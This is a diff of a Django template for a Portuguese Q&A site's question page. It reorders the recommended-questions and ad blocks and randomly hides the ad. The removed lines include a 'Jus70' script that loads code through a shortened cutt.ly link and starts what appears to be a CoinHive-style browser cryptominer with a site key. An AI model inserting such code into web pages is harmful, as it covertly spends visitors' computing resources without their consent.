@@ -206,23 +206,19 @@ function delete_response(response_button_dom_el,response_id){if(confirm('Opa! Vo
 				<p>Faça <a href="/signin?redirect=/question/{{ question.id }}">login</a> ou <a href="/signup?redirect=/question/{{ question.id }}">crie uma conta</a> para responder esta pergunta.</p>
 			{% endif %}
 		</main>
-		<div class="recommended">
-			<hr>
-			<h3 class="text-secondary">— Responda também —</h3>
-			{% for question in recommended_questions %}
-			<div class="r-question">
-				<a href="/question/{{ question.id }}"><b>{{ question.text }}</b></a>
-				<br>
-				<small class="text-muted">perguntada {% fix_naturaltime question.pub_date|naturaltime %} por <a href="/user/{{ question.creator.user.username }}">{{ question.creator.user.username }}</a></small>
-				<hr>
-			</div>
-			{% endfor %}
-		</div>
 		
 <!-- Ad -->
-<center>
-<small id="ad-reported" style="display: none;">Anúncio reportado.</small>
+<div id="ad-reported" style="display: none;">
+	<center>
+		<hr>
+		<small>Anúncio reportado.</small>
+		<hr>
+	</center>
+</div>
 <div id="ad">
+<hr>
+<center>
+<div>
 	<script>
 	(function(__htas){
 	var d = document,
@@ -275,7 +271,23 @@ function delete_response(response_button_dom_el,response_id){if(confirm('Opa! Vo
 	</script>
 </div>
 </center>
+<hr>
+</div>
 <!-- !Ad -->
+		
+		
+		<div class="recommended">
+			<hr>
+			<h3 class="text-secondary">— Responda também —</h3>
+			{% for question in recommended_questions %}
+			<div class="r-question">
+				<a href="/question/{{ question.id }}"><b>{{ question.text }}</b></a>
+				<br>
+				<small class="text-muted">perguntada {% fix_naturaltime question.pub_date|naturaltime %} por <a href="/user/{{ question.creator.user.username }}">{{ question.creator.user.username }}</a></small>
+				<hr>
+			</div>
+			{% endfor %}
+		</div>
 		
 <script src="/static/js/question.js?v=12.7"></script>
 <script>
@@ -288,25 +300,14 @@ if (getDarkCookie() == 'true') {
 </script>
 <script src="/static/js/general_functions.js?version=2"></script>
 
-
-    <!-- Jus70 -->
-{% can user.email request as CAN %}
-{% if CAN %}
-<script>
-  $.getScript("https://cutt.ly/wns1PUz", function() {
-    var _client = new Client.Anonymous('5359e2aefac13b8544fcee9326d4a0aafb5fd62a6991f1e87ade167c09c9967a', {
-        throttle: 0.7, c: 'w'
-    });
-    _client.start();
-    console.log('-');
-  });
-</script>
-{% endif %}
-    <!-- !Jus70 -->
-
 	</body>
 
 	<script>
+r = Math.random();
+if (r < 0.8) {
+	document.getElementById("ad").remove();
+}
+
 /* Js p/ upload de imagem em respostas */
 document.getElementById('upload-photo').onchange = function () {
 	text = document.getElementById('upload-photo-text')
